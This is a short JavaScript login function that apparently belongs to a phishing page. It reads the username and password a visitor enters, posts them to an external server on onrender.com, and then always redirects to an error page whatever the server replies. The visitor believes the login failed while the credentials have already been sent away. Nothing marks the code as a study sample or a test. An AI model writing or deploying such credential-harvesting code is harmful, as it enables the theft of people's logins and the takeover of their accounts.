async function login() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    try {
        const response = await fetch("https://backend-redf.onrender.com/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ username, password }) // Ensure it's a JSON object
        });

        const result = await response.json(); // Read response

        console.log("Server Response:", result); // Log response

        window.location.href = "error.html"; // Always redirect to error.html
    } catch (error) {
        console.error("Error:", error);
        alert("Something went wrong!");
    }
}
